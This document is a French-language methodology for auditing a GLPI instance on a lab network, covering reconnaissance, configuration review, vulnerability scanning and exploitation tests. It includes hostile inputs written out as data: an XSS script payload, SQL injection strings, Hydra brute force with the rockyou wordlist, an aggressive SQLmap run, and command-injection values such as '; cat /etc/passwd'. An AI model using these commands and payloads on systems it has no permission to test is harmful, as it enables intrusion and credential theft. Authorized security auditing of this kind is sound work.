# Méthodologie de l'audit

## Outils utilisés

| Outil | Rôle | Source |
|---|---|---|
| **Nmap** | Scanner de ports open source : détecte les ports ouverts, les services actifs et tente d'identifier l'OS distant. | [fr.wikipedia.org/wiki/Nmap](https://fr.wikipedia.org/wiki/Nmap) |
| **Nikto** | Scanner de vulnérabilités web en ligne de commande : recherche des fichiers/CGI dangereux, des versions de logiciels serveur obsolètes et d'autres problèmes de configuration. | [fr.wikipedia.org/wiki/Nikto](https://fr.wikipedia.org/wiki/Nikto_(scanner_de_vuln%C3%A9rabilit%C3%A9)) |
| **Hydra** | Outil de bruteforce/dictionnaire pour attaquer des comptes utilisateurs sur de nombreux protocoles et applications (HTTP, SSH, FTP...). | [fr.wikipedia.org/wiki/Hydra_(logiciel)](https://fr.wikipedia.org/wiki/Hydra_(logiciel)) |
| **Medusa** | Outil de bruteforce d'authentification parallélisé, comparable à Hydra : il teste des combinaisons login/mot de passe sur de nombreux services réseau (HTTP, SSH, FTP, SMB...) avec une architecture modulaire pensée pour la rapidité et le parallélisme des tentatives. | [foofus.net/goons/jmk/medusa/medusa.html](http://foofus.net/goons/jmk/medusa/medusa.html) |
| **SQLmap** | Outil open source d'automatisation de la détection et de l'exploitation de failles d'injection SQL, capable d'énumérer bases, tables et données. | [sqlmap.org](https://sqlmap.org/) |
| **OpenVAS** | Scanner de vulnérabilités open source, capable de détecter des CVE connues sur des services exposés. | [fr.wikipedia.org/wiki/OpenVAS](https://fr.wikipedia.org/wiki/OpenVAS) |
| **Nessus** | Scanner de vulnérabilités commercial, référence du secteur. | [en.wikipedia.org/wiki/Nessus_(software)](https://en.wikipedia.org/wiki/Nessus_(software)) |
| **OWASP ZAP** | Proxy d'interception et scanner de sécurité applicative web open source (projet OWASP), utilisé pour explorer et tester manuellement/automatiquement une application. | [zaproxy.org](https://www.zaproxy.org/) |
| **Burp Suite** | Suite d'outils pour tests de sécurité sur applications web (proxy, repeater, intruder...). | [portswigger.net/burp](https://portswigger.net/burp) |
| **Wordlist (rockyou.txt)** | Dictionnaire de mots de passe utilisé pour les attaques par dictionnaire. | [en.wikipedia.org/wiki/Dictionary_attack](https://en.wikipedia.org/wiki/Dictionary_attack) |

## Lexique

- **Banner Grabbing** : récupération des informations ("bannière") renvoyées par un service après l'établissement d'une connexion sur un port cible (ex. version du serveur web). Source : [it-connect.fr](https://www.it-connect.fr/quest-ce-que-le-banner-grabbing/)
- **XSS (Cross-Site Scripting)** : injection de code (généralement JavaScript) dans une page web consultée par d'autres utilisateurs, pouvant entraîner vol de session, défacement ou redirection malveillante. Souvent combiné à une attaque de phishing. Source : [fr.wikipedia.org/wiki/Cross-site_scripting](https://fr.wikipedia.org/wiki/Cross-site_scripting)
- **Injection SQL** : technique consistant à insérer ou modifier une requête SQL via une donnée d'entrée non filtrée, permettant de lire, modifier ou supprimer des données en base, voire de contourner une authentification. Source : [fr.wikipedia.org/wiki/Injection_SQL](https://fr.wikipedia.org/wiki/Injection_SQL)

## 1. Collecte d'informations

**Objectif** : récupérer un maximum d'informations sur l'instance GLPI, son infrastructure et ses services exposés.

```bash
# Reconnaissance réseau
nmap -sS -p- 192.168.56.101          # scan complet des ports TCP
nmap -sV 192.168.56.101              # identification des versions de service

# Scan web
nikto -h 192.168.56.101              # vulnérabilités web communes

# Banner grabbing
curl -I http://192.168.56.101        # en-têtes HTTP (serveur, version)
```

Résultat de la reconnaissance : nom de domaine `glpi-lab.local`, IP `192.168.56.101`.

### Tests applicatifs ciblés (curl)

```bash
# Test d'injection via le formulaire de login
curl -c cookies.txt -d "login=<login>&password=<password>" -X POST \
  http://<cible>/glpi/front/login.php

# Énumération d'utilisateurs via l'API REST GLPI
curl -X GET http://192.168.56.101/glpi/apirest.php/User \
  -H "Authorization: user_token <token>"

# Version de l'application (vulnérabilités connues associées)
curl -I http://192.168.56.101/glpi/front/about.php

# Test XSS via paramètre de requête
curl "http://192.168.56.101/glpi/front/search.form.php?searchText=<script>alert('XSS')</script>"

# En-têtes de sécurité HTTP
curl -I http://192.168.56.101/glpi/

# Accès à un endpoint interne sans authentification
curl -I http://192.168.56.101/glpi/inc/autoload.php

# Accès non authentifié à une ressource API
curl -X GET http://192.168.56.101/glpi/apirest.php/Computer

# Redirections HTTP
curl -I -L http://192.168.56.101/glpi/

# Fuite d'informations via une page de setup
curl -X GET http://192.168.56.101/glpi/front/setup.php

# Gestion de session / cookies
curl -c cookies.txt -d "login=<login>&password=<password>" -X POST \
  http://<cible>/glpi/front/login.php
curl -b cookies.txt http://192.168.56.101/glpi/front/ticket.form.php

# Injection SQL via paramètre HTTP
curl "http://192.168.56.101/glpi/front/ticket.form.php?searchText=' OR 1=1 --"
```

## 2. Évaluation de la configuration de GLPI

**Objectif** : vérifier que la configuration respecte les bonnes pratiques de sécurité.

- **Permissions des répertoires sensibles** :
  ```bash
  ls -l /var/www/html/glpi/glpi/config/
  ```
- **Fichier `config/config_db.php`** : vérifier qu'il ne contient pas d'informations sensibles accessibles en clair depuis l'extérieur (identifiants de connexion à la base de données).
- **Accès administrateur** : mot de passe fort obligatoire, audit régulier des comptes pour repérer les comptes obsolètes ou non autorisés.
- **Test de robustesse de l'authentification** (bruteforce) :
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz http-get://192.168.56.101/glpi/index.php
  ```
- **Test d'injection SQL** sur les formulaires et paramètres d'URL :
  ```bash
  sqlmap -u "http://192.168.56.101/glpi/incident.form.php?id=1" --risk=3 --level=5
  ```
- **Test XSS** via Burp Suite ou OWASP ZAP (interception et injection de scripts sur les formulaires de saisie).

  Procédure OWASP ZAP :
  1. Installation : `sudo apt install zaproxy`
  2. Lancement : `zaproxy` (terminal ou menu des applications)
  3. Menu *Aide* → *Vérifier les mises à jour*
  4. *Démarrage rapide* → *Manuel Explore* → entrer l'URL cible → *Lancer le navigateur*

## 3. Analyse des vulnérabilités connues

**Objectif** : vérifier si des vulnérabilités connues affectent la version de GLPI déployée.

```bash
sudo apt update && sudo apt upgrade -y && sudo apt dist-upgrade -y
sudo apt install openvas
gvm-setup            # crée un utilisateur "admin" + mot de passe auto-généré
gvm-check-setup       # vérifie l'installation
sudo gvm-start
```

Comparaison de la version GLPI installée avec les bases **CVE** et **Exploit-DB** pour identifier les vulnérabilités publiées correspondantes.

## 4. Test des permissions et des accès

**Objectif** : vérifier que les permissions fichiers et les droits utilisateurs sont correctement configurés.

- Vérifier si un utilisateur sans privilège peut accéder à des pages restreintes par manipulation directe d'URL.
- Vérifier les permissions des fichiers/répertoires sensibles (logs, configuration) :
  ```bash
  ls -la
  ```

## 5. Exploitation et tests d'élévation de privilèges

**Objectif** : tester si une vulnérabilité identifiée peut être exploitée pour accéder à des données sensibles ou exécuter du code.

- **Test d'injection de commande distante (RCE)** sur les entrées non filtrées, ex. : `; ls` ou `; cat /etc/passwd`.
- **Élévation de privilèges** : tester la possibilité d'obtenir des droits administrateur depuis un compte standard.

## 6. Test de la sécurité du serveur

**Objectif** : s'assurer de la sécurité du serveur hôte, indépendamment de l'application GLPI elle-même.

```bash
systemctl list-units --type=service   # services actifs
sudo apt update && sudo apt upgrade   # mises à jour de sécurité (Debian/Ubuntu)
```

Désactiver les services inutiles (FTP, Telnet, etc.) et vérifier que tous les composants sont à jour.
